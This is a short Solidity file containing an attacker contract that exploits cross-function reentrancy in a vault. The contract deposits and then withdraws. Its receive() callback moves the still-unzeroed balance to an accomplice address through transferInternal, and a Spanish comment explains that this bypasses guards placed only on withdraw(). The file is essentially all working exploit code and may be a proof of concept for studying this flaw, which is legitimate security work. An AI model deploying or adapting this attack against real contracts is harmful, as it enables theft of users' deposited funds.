// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ILedgerVault {
    function deposit() external payable;
    function withdraw() external;
    function transferInternal(address to, uint256 amount) external;
    function balances(address account) external view returns (uint256);
}

contract CrossFunctionAttacker {
    ILedgerVault public immutable vault;
    address public immutable accomplice;

    constructor(address _vault, address _accomplice) {
        vault = ILedgerVault(_vault);
        accomplice = _accomplice;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    /// @dev En vez de reentrar en withdraw(), mueve el balance (todavia sin
    ///      poner a cero) a `accomplice` a través de una función que no hace
    ///      ninguna llamada externa y por tanto no "parece" necesitar guardia.
    receive() external payable {
        uint256 bal = vault.balances(address(this));
        if (bal > 0) {
            vault.transferInternal(accomplice, bal);
        }
    }
}
